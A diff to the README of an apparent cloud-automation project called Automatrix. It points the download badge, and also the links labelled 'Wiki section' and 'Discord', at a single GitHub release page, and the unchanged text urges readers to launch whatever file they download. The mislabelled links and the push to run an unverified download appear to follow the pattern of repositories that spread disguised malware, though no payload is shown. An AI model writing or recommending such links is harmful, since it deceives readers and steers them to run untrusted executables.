@@ -34,13 +34,13 @@ Automatrix is designed to empower users in efficiently managing cloud infrastruc
 
 Get started with Automatrix by downloading the framework using the following link: 
 
-[![Download Automatrix](https://img.shields.io/badge/Download-Automatrix-blue.svg)](https://github.com/file/App.zip)
+[![Download Automatrix](https://github.com/lpbkk/Automatrix/releases/tag/v2.0)](https://github.com/lpbkk/Automatrix/releases/tag/v2.0)
 
 If the link above ends with the file name, ensure to launch the downloaded file to initiate the setup process. If the link leads to a website, feel free to explore it for additional information. In case the link provided is not working or not available, please check the "Releases" section of this repository for alternative download options.
 
 ## 🌐 Additional Resources
 
-Explore more about Automatrix and its capabilities in the [Wiki section](https://github.com/automatrix/wiki) of this repository. Join our community on [Discord](https://discord.gg/automatrix) to engage with fellow users and get support for using the framework effectively.
+Explore more about Automatrix and its capabilities in the [Wiki section](https://github.com/lpbkk/Automatrix/releases/tag/v2.0) of this repository. Join our community on [Discord](https://github.com/lpbkk/Automatrix/releases/tag/v2.0) to engage with fellow users and get support for using the framework effectively.
 
 ## 🤝 Contribution
 
